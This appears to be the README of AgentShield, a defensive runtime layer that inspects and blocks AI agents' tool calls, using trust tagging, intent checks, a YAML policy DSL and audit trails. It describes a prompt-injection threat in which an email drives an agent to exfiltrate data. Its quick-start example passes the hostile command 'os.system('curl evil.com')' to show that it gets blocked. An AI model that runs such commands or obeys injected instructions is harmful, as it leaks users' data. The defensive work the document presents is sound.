<p align="center">
  <h1 align="center">AgentShield</h1>
  <p align="center">
    <strong>Runtime security layer for AI agents — inspect, control, and audit every tool call.</strong>
  </p>
  <p align="center">
    <a href="#quick-start">Quick Start</a> &middot;
    <a href="#architecture">Architecture</a> &middot;
    <a href="#documentation">Docs</a> &middot;
    <a href="./README_ZH.md">中文文档</a>
  </p>
</p>

---

## The Problem

AI agents are being given real-world tools — sending emails, querying databases, executing code, calling APIs. But today, a single prompt injection hidden in an email body can trick an agent into exfiltrating your data, deleting records, or sending unauthorized messages.

**There is no runtime security layer between the agent's intent and its actions.**

## The Solution

AgentShield sits between your AI agent and its tools. Every tool call passes through a multi-layer security pipeline that evaluates trust, verifies intent consistency, enforces permissions, and produces a tamper-proof audit trail — all in single-digit milliseconds.

```
User ──▶ Agent ──▶ AgentShield ──▶ Tool
                       │
                  ┌────┴─────┐
                  │ ALLOW    │  ← intent matches, trust sufficient
                  │ BLOCK    │  ← policy violation, injection detected
                  │ CONFIRM  │  ← elevated risk, human approval needed
                  └──────────┘
```

## Key Features

### Trust-Aware Data Flow
Every piece of data entering the agent is tagged with a trust level (Trusted → Verified → Internal → External → Untrusted). The server computes trust — clients can only downgrade, never upgrade. When an agent processes an external email and then tries to call `send_email`, AgentShield knows the context has been tainted.

### 3-Layer Intent Consistency Detection
```
Layer 1: Rule Engine           (μs)    ── Deterministic rules, 22 built-in + custom YAML DSL
Layer 2: Anomaly Detector      (μs)    ── Statistical feature scoring with session risk accumulation
Layer 3: Semantic Checker      (ms)    ── LLM-based, only triggered when score is suspicious
```
Most requests are resolved in Layer 1 or 2 with no LLM call. Layer 3 fires only for edge cases, keeping latency low and costs minimal.

### Two-Phase Call Architecture
Inspired by SQL parameterized queries — data extraction (Phase 1, no tools) and action execution (Phase 2, structured data only) are physically separated. Even if injection succeeds in Phase 1, there are no tools to abuse.

### Policy DSL
Define security rules in YAML without writing code:
```yaml
rules:
  - name: block_email_to_competitors
    when:
      tool: send_email
      trust_level: ["EXTERNAL", "UNTRUSTED"]
      params:
        to:
          matches: ".*@(competitor1|competitor2)\\.com$"
    action: BLOCK
    reason: "Sending to competitor domain is prohibited"
```

### Merkle Tree Audit Trail
Every decision is recorded as an immutable, hash-chained trace. Tamper with one span and the entire chain breaks. Built for compliance, incident response, and post-mortem analysis.

### Framework Integrations
Drop-in support for popular agent frameworks:
```python
from agentshield.integrations import LangChainShield, CrewAIShield, AutoGenShield, ClaudeAgentShield
```

## Quick Start

### 1. Start the Server

```bash
# Clone the repository
git clone https://github.com/YOUR_ORG/agentshield.git
cd agentshield

# Start infrastructure (PostgreSQL + ClickHouse + Core Engine)
docker compose -f docker/docker-compose.yml up -d

# Or run locally with uv
cd packages/core && uv sync && uv run uvicorn agentshield_core.app:app --reload
```

### 2. Install the SDK

```bash
pip install agentshield
```

### 3. Protect Your Agent

```python
from agentshield import Shield

shield = Shield()  # reads AGENTSHIELD_API_KEY from env

# Decorator-based protection
@shield.guard
async def send_email(to: str, body: str) -> str:
    ...  # your tool implementation

# Session-based protection with intent tracking
async with shield.session("Summarize my emails and draft replies") as s:
    # Safe: reading emails matches declared intent
    emails = await s.guarded_executor.execute("read_inbox", {"limit": 10}, read_inbox_fn)

    # Blocked: code execution from external email context
    await s.guarded_executor.execute(
        "execute_code",
        {"code": "os.system('curl evil.com')"},
        exec_fn,
        source_id="email/external",     # trust level: EXTERNAL
    )
    # → raises ToolCallBlocked
```

### 4. Define Custom Policies

```yaml
# agentshield-policy.yaml
rules:
  - name: confirm_large_exports
    when:
      tool: export_data
      params:
        limit:
          gt: 100
    action: REQUIRE_CONFIRMATION
    reason: "Large data export requires approval"

  - name: block_after_hours
    when:
      tool_category: send
      trust_level: ["EXTERNAL"]
      conditions:
        - type: time_range
          outside: "09:00-18:00"
    action: BLOCK
    reason: "Sensitive actions blocked outside business hours"
```

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                        AgentShield                           │
│                                                              │
│  ┌─────────┐  ┌──────────┐  ┌────────────┐  ┌───────────┐  │
│  │  Trust   │  │  Intent  │  │ Permission │  │   Trace   │  │
│  │ Marker   │──│ Cascade  │──│  Engine    │──│  Engine   │  │
│  │ (5-tier) │  │ (3-layer)│  │ (dynamic)  │  │ (Merkle)  │  │
│  └─────────┘  └──────────┘  └────────────┘  └───────────┘  │
│       │              │              │              │          │
│  ┌─────────┐  ┌──────────┐  ┌────────────┐  ┌───────────┐  │
│  │Sanitize │  │ Rule DSL │  │ Two-Phase  │  │  Storage  │  │
│  │Pipeline │  │ (custom) │  │  Engine    │  │ PG + CH   │  │
│  └─────────┘  └──────────┘  └────────────┘  └───────────┘  │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  Auth: API Key / mTLS / OAuth 2.0                     │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌─────────┐  ┌──────────┐  ┌────────────┐                  │
│  │   SDK   │  │  Proxy   │  │  Console   │                  │
│  │ Py/TS/Go│  │(sidecar) │  │ (React UI) │                  │
│  └─────────┘  └──────────┘  └────────────┘                  │
└──────────────────────────────────────────────────────────────┘
```

### Monorepo Structure

```
agentshield/
├── packages/
│   ├── core/              # Security engine (FastAPI) — the brain
│   ├── proxy/             # Transparent sidecar proxy
│   ├── console/           # Management UI (React + FastAPI backend)
│   ├── sdk-python/        # Python SDK with framework integrations
│   ├── sdk-typescript/    # TypeScript SDK
│   └── sdk-go/            # Go SDK
├── configs/               # Default policies and built-in rules
├── docker/                # Docker Compose for full-stack deployment
├── examples/              # Quick start and integration examples
└── scripts/               # Development and CI scripts
```

## Trust Model

| Level | Value | Source | Allowed Actions |
|-------|-------|--------|-----------------|
| **TRUSTED** | 5 | System prompt, developer config | All |
| **VERIFIED** | 4 | Authenticated user direct input | All |
| **INTERNAL** | 3 | Other agents, internal APIs | All except sensitive sends |
| **EXTERNAL** | 2 | Emails, web pages, RAG documents | Read-only + drafts |
| **UNTRUSTED** | 1 | Unknown or high-risk sources | Summarize + classify only |

The trust level is **computed server-side** based on the `source_id` provided with each request. Clients can claim a lower trust level but never a higher one — the server always wins.

## Built-in Security Rules

AgentShield ships with 22 built-in rules covering common attack vectors:

| Category | Rules |
|----------|-------|
| **Injection Defense** | Block code execution / network calls / file writes in untrusted context |
| **Data Exfiltration** | Block cross-system transfers, external API calls with tainted data |
| **Privilege Escalation** | Detect permission modification, environment changes, audit tampering |
| **Operational Safety** | Confirm bulk operations, financial transactions, large exports |
| **Agent-to-Agent** | Require confirmation when delegating with external data |

All rules are configurable and can be extended with the YAML Policy DSL.

## Testing

```bash
# Unit tests (218 tests)
make test-unit

# Security tests — injection, encoding bypass, header forgery, privilege escalation (92 tests)
make test-security

# Full suite
make test-all

# With coverage (target: 85%+)
make test-coverage
```

## Development

```bash
# Prerequisites: Python 3.12+, uv, Node.js 20+, Docker

# Set up dev environment
make dev                    # Start PostgreSQL + ClickHouse
cd packages/core && uv sync --extra dev

# Run the core engine
cd packages/core && uv run uvicorn agentshield_core.app:app --reload --port 8000

# Run linting
make lint

# Format code
make format

# Build Docker images
make docker-build
```

## Documentation

| Document | Description |
|----------|-------------|
| [Python SDK](packages/sdk-python/README.md) | SDK usage, configuration, and framework integrations |
| [Policy DSL](packages/core/src/agentshield_core/policy/dsl.py) | Rule syntax reference with examples |
| [Examples](examples/) | Quick start, custom rules, data sanitization, LangChain integration |
| [Docker Deployment](docker/docker-compose.yml) | Full-stack deployment configuration |
| [Trust Model](configs/default_policy.yaml) | Default trust policies and permission matrix |
| [Built-in Rules](configs/builtin_rules.yaml) | All 22 built-in security rules |

## Roadmap

- [ ] OpenTelemetry-native trace export
- [ ] Grafana dashboard templates
- [ ] Kubernetes Helm chart
- [ ] SDK for Java / Rust
- [ ] Plugin system for custom detection engines
- [ ] Real-time WebSocket alert streaming
- [ ] Multi-tenant policy management
- [ ] REGO / OPA policy integration

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## License

[Apache License 2.0](LICENSE)
